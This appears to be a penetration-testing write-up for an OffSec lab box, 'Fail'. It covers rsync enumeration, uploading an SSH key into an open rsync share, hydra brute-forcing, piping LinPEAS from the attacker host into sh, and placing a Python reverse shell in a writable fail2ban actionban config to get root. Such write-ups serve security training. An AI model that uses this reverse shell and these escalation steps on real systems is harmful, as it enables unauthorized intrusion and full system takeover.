# Fail (rough notes)

Initial TCP port scan:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nmap -v -p- -T4 fail    
...

PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync
```

Interesting... not many ports... so I run a UDP scan on the top 1000 ports to be safe:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ sudo nmap -v -sU -T4 --top-ports 1000 fail 
         (... no results ...)
```

Service service version fingerprinting on the open TCP ports:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nmap -v -p 22,873 -A -T4 fail
...

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I check [`nmap`'s documentation](https://nmap.org/nsedoc/scripts/) to see if there are any `rsync` scripts.

I run `nmap` again with rsync specific scripts against port 873:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nmap -script rsync* -v -p 873 -T4 fail 
...

PORT    STATE SERVICE
873/tcp open  rsync

         (... no results ...)
```

Nothing... okay... I refer to [Hacktricks' page on penetesting rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)...

So we connect manually with netcat and receive a banner:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nc -vn 192.168.151.126 873
(UNKNOWN) [192.168.151.126] 873 (rsync) open
@RSYNCD: 31.0
```

We respond with the same rsync version and then request the server to list:

```
@RSYNCD: 31.0
#list
```

The server responds and terminates the connection:

```
fox            	fox home
@RSYNCD: EXIT
```

So we have a shared 'fox' directory, let's list it:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nc -vn 192.168.151.126 873                       
(UNKNOWN) [192.168.151.126] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
fox
@RSYNCD: OK
```

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ rsync -av --list-only rsync://192.168.151.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 06:21:59 .
lrwxrwxrwx              9 2020/12/03 12:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/17 21:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/17 21:12:36 .bashrc
-rw-r--r--            807 2019/04/17 21:12:36 .profile
```

I downloaded the files and searched them for any info...

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ rsync -av rsync://192.168.151.126/fox .          
receiving incremental file list

sent 20 bytes  received 136 bytes  13.57 bytes/sec
total size is 4,562  speedup is 29.24
```

I found nothing... But we've now learned of a potential user `fox`. I kick off brute forcing the ssh service as user `fox` with hydra in the background while I keep investigating.

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://fail                       
...
```

I think we can upload files through rsync... maybe we can upload an ssh key.

I generate the key

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ ssh-keygen       
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/offsec/fail/id_ed25519
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/offsec/fail/id_ed25519
Your public key has been saved in /home/kali/offsec/fail/id_ed25519.pub
The key fingerprint is:
SHA256:XEcrdQKOaE9bMvxAQo2KedMwafDyJwfrePfvBXIxTj0 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|  .. ooo. ..+ .  |
|   .= .=.o + +   |
|  .+o=o B O E    |
|  oo++.+ @ = .   |
|   .+.o S =      |
|   o +   o .     |
|  . o .     .    |
|   . . .   .     |
|        .oo      |
+----[SHA256]-----+
```

I upload the key to the public key to the remote machine

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ rsync -av id_ed25519.pub rsync://192.168.151.126/fox/.ssh/authorized_keys
sending incremental file list
created directory /.ssh
id_ed25519.pub

sent 203 bytes  received 35 bytes  20.70 bytes/sec
total size is 91  speedup is 0.38
```

And I try to connect via ssh with the private key

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ ssh fox@fail -i id_ed25519
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 16 13:44:20 2024 from 192.168.45.172
$ whoami
fox
```

Great! We made it in. I look for the access flag and find it in user `/home`:

```
$ pwd
/home
$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Jan 21  2021 .
drwxr-xr-x 18 root root 4096 Nov 19  2020 ..
drwxr-xr-x  3 fox  fox  4096 Mar 16 13:41 fox
-rw-r--r--  1 fox  fox    33 Mar 16 13:33 local.txt
$ cat local.txt
0514d88efa70ef50d59d7339fd2c6659
```

## Privilege Escalation

We get ourselves a better shell in the victim box:

```
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/bash")'
fox@fail:/home$ 
```

Time for LinPEAS! The victim machine cannot talk to the internet so we download LinPEAS to Kali and serve it from there:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh  
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/offsec/fail]
└─$ python -m http.server 80                                                                      
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Dowload it in the victim box and pipe it to `sh`:

```
fox@fail:/home$ wget -O- http://192.168.45.172/linpeas.sh | sh
--2024-03-16 13:58:05--  http://192.168.45.172/linpeas.sh
Connecting to 192.168.45.172:80... connected.
HTTP request sent, awaiting response... 200 OK
    (... output ...)
```

The most promising results are:

- A highly probably kernel exploit

```
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
```

- We have a `fail2ban` process running as root, and it seems the config files are writable by us

```
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
         (... other processes ...)
root      1241  0.6  0.9 250320 20304 ?        Ssl  13:58   0:00 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group fail2ban:
/etc/fail2ban/action.d
/etc/fail2ban/action.d/firewallcmd-ipset.conf
/etc/fail2ban/action.d/nftables-multiport.conf
/etc/fail2ban/action.d/firewallcmd-multiport.conf
/etc/fail2ban/action.d/mail-whois.conf
/etc/fail2ban/action.d/ufw.conf
#)You_can_write_even_more_files_inside_last_directory
```

This second finding is more relevant imo... let's dig.

Checking the `/etc/fail2ban` directory we find an interesting `README.fox` file:

```
fox@fail:/etc/fail2ban$ ls -la
total 72
drwxr-xr-x  6 root root      4096 Dec  3  2020 .
drwxr-xr-x 76 root root      4096 Jan 21  2021 ..
drwxrwxr-x  2 root fail2ban  4096 Dec  3  2020 action.d
-rw-r--r--  1 root root      2334 Jan 18  2018 fail2ban.conf
drwxr-xr-x  2 root root      4096 Sep 23  2018 fail2ban.d
drwxr-xr-x  3 root root      4096 Dec  3  2020 filter.d
-rw-r--r--  1 root root     22910 Nov 19  2020 jail.conf
drwxr-xr-x  2 root root      4096 Dec  3  2020 jail.d
-rw-r--r--  1 root root       645 Jan 18  2018 paths-arch.conf
-rw-r--r--  1 root root      2827 Jan 18  2018 paths-common.conf
-rw-r--r--  1 root root       573 Jan 18  2018 paths-debian.conf
-rw-r--r--  1 root root       738 Jan 18  2018 paths-opensuse.conf
-rw-r--r--  1 root root        87 Dec  3  2020 README.fox
```

```
fox@fail:/etc/fail2ban$ cat README.fox
Fail2ban restarts each 1 minute, change ACTION file following Security Policies. ROOT!
```

Okay, thats great news.

I search Google for `fail2ban` privilege escalation and I learn that `jail.conf` is where we want to look next! This is the configuration file which determines what "bans" to apply e.g. actions to take on certain events.

Here are some notable sections of this file:

```
# External command that will take an tagged arguments to ignore, e.g. <ip>,
# and return true if the IP is to be ignored. False otherwise.
#
# ignorecommand = /path/to/command <ip>
ignorecommand =

# "bantime" is the number of seconds that a host is banned.
bantime  = 1m

# A host is banned if it has generated "maxretry" during the last "findtime"
# seconds.
findtime  = 10m

# "maxretry" is the number of failures before a host get banned.
maxretry = 2
```

```
# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
```

So we've learned that:

- `ignorecommand` will run for every IP that connects
- a host will be banned for `1m` if they connect with `2` failed attempts in the last 10 minutes
- the applied ban will be `iptables-multiport`

Looking at the only file in `jail.d` we learn that fail2ban is enabled for ssh:

```
fox@fail:/etc/fail2ban/jail.d$ cat defaults-debian.conf 
[sshd]
enabled = true
```

Looking at the actual action configuration (in `/etc/fail2ban/action.d/iptables-multiport.conf`):

```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

We see the command that will be executed when a host is banned... we'll just put a reverse shell here... I change that part of the file to:

> I copy the file to `/tmp/tmp.conf` and modify that

```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.172",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2
(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

I set up my local listener in Kali:

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nc -lvnp 80  
listening on [any] 80 ...
```

I move the `/tmp/tmp.conf` file to `/etc/fail2ban/action.d/iptables-multiport.conf` and verify the contents are as expected:

```
fox@fail:/etc/fail2ban/action.d$ cp /tmp/tmp.conf /etc/fail2ban/action.d/iptables-multiport.conf
fox@fail:/etc/fail2ban/action.d$ cat /etc/fail2ban/action.d/iptables-multiport.conf | grep actionban
# Notes.:  command executed once before each actionban command
# Option:  actionban
actionban = python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.172",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2
(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

I wait a couple of minutes for the config to get picked up, then generate a few failed connections from the Kali machine (to trigger the `actionban` command)

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ ssh fox@fail
fox@fail's password: 
Permission denied, please try again.
fox@fail's password: 
Permission denied, please try again.
fox@fail's password: 
fox@fail: Permission denied (publickey,password).
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/offsec/fail]
└─$ ssh fox@fail
fox@fail's password: 
Permission denied, please try again.
fox@fail's password: 
Permission denied, please try again.
fox@fail's password: 
fox@fail: Permission denied (publickey,password).
                                                                                                                                                                                           
┌──(kali㉿kali)-[~/offsec/fail]
└─$ ssh fox@fail
fox@fail's password: 
Permission denied, please try again.
fox@fail's password: 
Permission denied, please try again.
fox@fail's password: 
fox@fail: Permission denied (publickey,password).
```

and we've caught a shell!

```
┌──(kali㉿kali)-[~/offsec/fail]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.151.126] 35032
root@fail:/#
```

We find our proof where we expect it:

```
root@fail:/# cd /root
cd /root
root@fail:/root# cat proof.txt
cat proof.txt
f3ccc46454bf6b2b1a0340d80661e770
```